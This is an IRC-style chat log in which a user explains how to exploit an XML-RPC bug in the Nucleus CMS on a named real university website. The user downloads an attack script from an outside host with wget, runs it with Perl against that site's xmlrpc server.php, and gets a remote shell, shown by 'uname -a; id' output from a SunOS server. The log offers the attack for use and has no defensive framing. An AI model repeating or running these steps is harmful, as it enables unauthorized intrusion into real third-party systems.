How to exploit a site with XML bug?

<&sql> First of all you need to have installed perl on ur OS, if you don't have use activeperl for windows, if u re using linux it's a better thing
<&sql> after it
<&sql> download this source code to ur pc
<&sql> wget http://theinvite.info/stuff/sqlxml.txt
<&sql> if u re using linux then use wget :)
<&sql> on win do it manually copy/paste to sqlxml.txt
<&sql> now lets go on
<&sql> to the funniest thing
<&sql> search ur sqlml.txt throught ur activeperl promt
<&sql> or linux console
<&sql> cd whatever
<&sql> now
<&sql> put this command when you have found it
<&sql> perl sqlxml.txt http://www.luiss.it/siti//nucleus/xmlrpc/server.php
<&sql> after that, try this command
<&sql> uname -a; id
<&sql> sql-shell@#uname -a;id
<&sql> SunOS marte 5.10 Generic_138888-08 sun4u sparc SUNW,Sun-Fire-V245
